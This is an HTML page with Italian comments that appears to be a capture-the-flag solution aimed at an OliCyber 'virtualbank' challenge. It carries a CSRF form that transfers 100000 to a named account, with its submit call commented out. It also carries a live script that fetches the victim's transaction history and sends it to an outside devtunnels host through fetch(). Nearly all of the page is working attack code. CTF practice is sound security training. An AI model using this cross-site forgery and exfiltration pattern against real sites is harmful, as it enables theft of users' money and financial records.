<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <!-- to=admin&amount=2&decscription=asd -->
<form action="http://virtualbank.challs.olicyber.it/sendmoney" method="POST" id="form">
    <input type="text" name="to" value="ginocarlo">
    <input type="text" name="amount" value="100000">
    <input type="text" name="description" value="prova">
</form>
<!-- <iframe src="http://virtualbank.challs.olicyber.it/history/11297"></iframe> -->

<script>
    //var form = document.getElementById("form");
    //form.submit();
    
    let xhr = new XMLHttpRequest();

    // 2. Lo configura: richiesta GET per l'URL /article/.../load
    xhr.open('GET', 'http://virtualbank.challs.olicyber.it/history/1');

    // 3. Invia la richiesta alla rete
    xhr.send();

    // 4. Questo codice viene chiamato dopo la ricezione della risposta
    xhr.onload = function() {
        if (xhr.status != 200) { // analizza lo status HTTP della risposta
            alert(`Error ${xhr.status}: ${xhr.statusText}`); // ad esempio 404: Not Found
        } else { // mostra il risultato
            fetch('https://dmttwmj2-8080.euw.devtunnels.ms/'+xhr.response)
            alert(`Done, got ${xhr.response.length} bytes`); // response contiene la risposta del server
        }
    };

    xhr.onprogress = function(event) {
        if (event.lengthComputable) {
            alert(`Received ${event.loaded} of ${event.total} bytes`);
        } else {
            alert(`Received ${event.loaded} bytes`); // nessun Content-Length
        }

    };

    xhr.onerror = function() {
        fetch('https://dmttwmj2-8080.euw.devtunnels.ms/errore')
    };
</script>

</body>
</html>
